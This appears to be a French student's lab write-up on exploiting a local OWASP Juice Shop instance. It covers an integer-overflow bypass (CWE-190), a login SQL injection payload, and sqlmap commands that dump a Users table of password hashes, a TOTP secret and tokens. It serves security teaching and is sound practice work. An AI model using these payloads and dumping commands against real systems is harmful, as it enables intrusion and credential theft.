# EX1
## Partie 1
1. Lisez le code source et trouvez une manière d’envoyer un montant plus élevé que la limite.
On peut exploitez l'overflow entier en fournissant une valeur de francs assez grande pour que le calcul francs * 100 dépasse la capacité d'un int et retourne une valeur inférieure ou égale à 100000, contournant ainsi la vérification

2. Quelle est le nom de la vulnérabilité ? sous quelle CWE peut-on la classer ?
C'est un overflow. vulnérabilité CWE-190 "Integer Overflow or Wraparound".

1. Comment pouvez-vous corriger la vulnérabilité ?
Pour corriger la vulnérabilité, il faut empêcher l'overflow en vérifiant avant la multiplication si francs est dans une plage sûre, ou utiliser des entiers plus larges (long).

## Partie 2 - "Login Admin"
1. il faut se loguer avec ' OR TRUE -- et cela passe

1. Quelle est l’utilité des paramètres --level et --risk ?
    Permet d'activer ou de désactiver les vérifications les plus dangereuses qui pourraient être facilement détectées par des contre-mesures potentielles.

1. Trouvez une URL GET avec un paramètre exploitable
    Recherche de produit côté serveur http://localhost:3000/rest/products/search?q=

1. Trouvez le nom de la table et de ses colonnes contenant l’email et le hash des utilisateurs
   sqlmap 'http://localhost:3000/rest/products/search?q=""' --level=3 --risk=3 --schema et on trouve la table Users

    sqlmap 'http://localhost:3000/rest/products/search?q=""' --dump -T Users
    on trouve ceci CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', `deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', `totpSecret` VARCHAR(255) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)
[18:54:57] [INFO] fetching entries for table 'Users'


2. Récupérez le contenu de ces deux colonnes
   ```
    Table: Users
[22 entries]
+----+------------+----------------------------+----------+----------------------------------+------------+--------------------------------+--------------------------------+--------------------------------+----------------------------------+------------------------------------------------------------------+-------------+-----------------------------------------------+
| id | role       | email                      | isActive | password                         | username   | createdAt                      | deletedAt                      | updatedAt                      | totpSecret                       | deluxeToken                                                      | lastLoginIp | profileImage                                  |
+----+------------+----------------------------+----------+----------------------------------+------------+--------------------------------+--------------------------------+--------------------------------+----------------------------------+------------------------------------------------------------------+-------------+-----------------------------------------------+
| 9  | admin      | J12934@juice-sh.op         | 1        | 0192023a7bbd73250516f069df18b500 | <blank>    | 2025-09-16 16:27:22.575 +00:00 | NULL                           | 2025-09-16 16:27:22.575 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/defaultAdmin.png |
| 15 | customer   | accountant@juice-sh.op     | 1        | e541ca7ecf72b8d1286474fc613e5e45 | <blank>    | 2025-09-16 16:27:22.575 +00:00 | NULL                           | 2025-09-16 16:27:22.575 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/default.svg      |
| 1  | customer   | admin@juice-sh.op          | 1        | 0c36e517e3fa95aabf1bbffc6744a4ef | <blank>    | 2025-09-16 16:27:22.575 +00:00 | NULL                           | 2025-09-16 16:27:22.575 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/default.svg      |
| 11 | admin      | amy@juice-sh.op            | 1        | 6edd9d726cbdc873c539e41ae8757b8c | bkimminich | 2025-09-16 16:27:22.575 +00:00 | NULL                           | 2025-09-16 16:27:22.575 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/defaultAdmin.png |
| 22 | deluxe     | asd@asd.asd                | 1        | 861917d5fa5f1172f931dc700d81a8fb | <blank>    | 2025-09-16 16:27:22.575 +00:00 | NULL                           | 2025-09-16 16:27:22.575 +00:00 | <blank>                          | d715c2c75d4a42d3825a050e0a0163c1959b51165373f17bd8eed7b1e05bf20d | <blank>     | assets/public/images/uploads/default.svg      |
| 3  | admin      | bender@juice-sh.op         | 1        | 3869433d74e3d0c86fd25562f836bc82 | <blank>    | 2025-09-16 16:27:22.575 +00:00 | NULL                           | 2025-09-16 16:27:22.575 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/defaultAdmin.png |
| 4  | customer   | bjoern.kimminich@gmail.com | 1        | f2f933d0bb0ba057bc8e33b8ebd6d9e8 | <blank>    | 2025-09-16 16:27:22.575 +00:00 | NULL                           | 2025-09-16 16:27:22.575 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/default.svg      |
| 12 | customer   | bjoern@juice-sh.op         | 1        | b03f4b0ba8b458fa0acdc02cdb953bc8 | <blank>    | 2025-09-16 16:27:22.575 +00:00 | NULL                           | 2025-09-16 16:27:22.575 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/default.svg      |
| 13 | admin      | bjoern@owasp.org           | 1        | 3c2abc04e4a6ea8f1327d0aae3714b7d | <blank>    | 2025-09-16 16:27:22.576 +00:00 | NULL                           | 2025-09-16 16:27:22.576 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/defaultAdmin.png |
| 14 | admin      | chris.pike@juice-sh.op     | 1        | 9ad5b0492bbe528583e128d2a8941de4 | wurstbrot  | 2025-09-16 16:27:22.576 +00:00 | NULL                           | 2025-09-16 16:27:22.576 +00:00 | IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH | <blank>                                                          | <blank>     | assets/public/images/uploads/defaultAdmin.png |
| 5  | customer   | ciso@juice-sh.op           | 1        | 030f05e45e30710c3ad3c32f00de0473 | <blank>    | 2025-09-16 16:27:22.576 +00:00 | NULL                           | 2025-09-16 16:27:22.576 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/default.svg      |
| 17 | admin      | demo                       | 1        | 7f311911af16fa8f418dd1a3051d6810 | <blank>    | 2025-09-16 16:27:22.576 +00:00 | NULL                           | 2025-09-16 16:27:22.576 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/12.png           |
| 19 | deluxe     | emma@juice-sh.op           | 1        | 9283f1b2e9669749081963be0462e466 | <blank>    | 2025-09-16 16:27:22.576 +00:00 | NULL                           | 2025-09-16 16:27:22.576 +00:00 | <blank>                          | efe2f1599e2d93440d5243a1ffaf5a413b70cf3ac97156bd6fab9b5ddfcbe0e4 | <blank>     | assets/public/images/uploads/13.jpg           |
| 21 | customer   | ethereum@juice-sh.op       | 1        | 10a783b9ed19ea1c67c3a27699f0095b | <blank>    | 2025-09-16 16:27:22.576 +00:00 | 2025-09-16 16:27:22.649 +00:00 | 2025-09-16 16:27:22.576 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/default.svg      |
| 2  | accounting | jim@juice-sh.op            | 1        | 963e10f92a70b4b463220cb4c5d636dc | <blank>    | 2025-09-16 16:27:22.576 +00:00 | NULL                           | 2025-09-16 16:27:22.576 +00:00 | <blank>                          | <blank>                                                          | 123.456.789 | assets/public/images/uploads/default.svg      |
| 18 | customer   | john@juice-sh.op           | 1        | 05f92148b4b60f7dacd04cceebb8f1af | <blank>    | 2025-09-16 16:27:22.576 +00:00 | NULL                           | 2025-09-16 16:27:22.576 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/default.svg      |
| 8  | customer   | mc.safesearch@juice-sh.op  | 1        | fe01ce2a7fbac8fafaed7c982a04e229 | <blank>    | 2025-09-16 16:27:22.576 +00:00 | NULL                           | 2025-09-16 16:27:22.576 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/default.svg      |
| 7  | customer   | morty@juice-sh.op          | 1        | 00479e957b6b42c459ee5746478e4d45 | j0hNny     | 2025-09-16 16:27:22.576 +00:00 | NULL                           | 2025-09-16 16:27:22.576 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/default.svg      |
| 20 | customer   | stan@juice-sh.op           | 1        | 402f1c4a75e316afec5a6ea63147f739 | E=ma²      | 2025-09-16 16:27:22.576 +00:00 | NULL                           | 2025-09-16 16:27:22.576 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/default.svg      |
| 6  | deluxe     | support@juice-sh.op        | 1        | e9048a3f43dd5e094ef733f3bd88ea64 | SmilinStan | 2025-09-16 16:27:22.576 +00:00 | NULL                           | 2025-09-16 16:27:22.576 +00:00 | <blank>                          | 8f70e0f4b05685efff1ab979e8f5d7e39850369309bb206c2ad3f7d51a1f4e39 | <blank>     | assets/public/images/uploads/20.jpg           |
| 16 | deluxe     | uvogin@juice-sh.op         | 1        | 2c17c6393771ee3048ae34d6b380c5ec | evmrox     | 2025-09-16 16:27:22.576 +00:00 | NULL                           | 2025-09-16 16:27:22.576 +00:00 | <blank>                          | b49b30b294d8c76f5a34fc243b9b9cccb057b3f675b07a5782276a547957f8ff | <blank>     | assets/public/images/uploads/default.svg      |
| 10 | customer   | wurstbrot@juice-sh.op      | 1        | c99a11a53a3748269e3f86d7ac38df11 | <blank>    | 2025-09-16 16:40:20.982 +00:00 | NULL                           | 2025-09-16 16:40:20.982 +00:00 | <blank>                          | <blank>                                                          | 0.0.0.0     | /assets/public/images/uploads/default.svg     |
+----+------------+----------------------------+----------+----------------------------------+------------+--------------------------------+--------------------------------+--------------------------------+----------------------------------+------------------------------------------------------------------+-------------+-----------------------------------------------+
   ```
3. Tentez de cracker ces hashes
   
4. Quel est le nom de la vulnérabilitée exploitée ici ? Quel type de requête SQL est utilisée pour accéder aux tables ?
   
5. Comment corrigeriez-vous la vulnérabilité ?
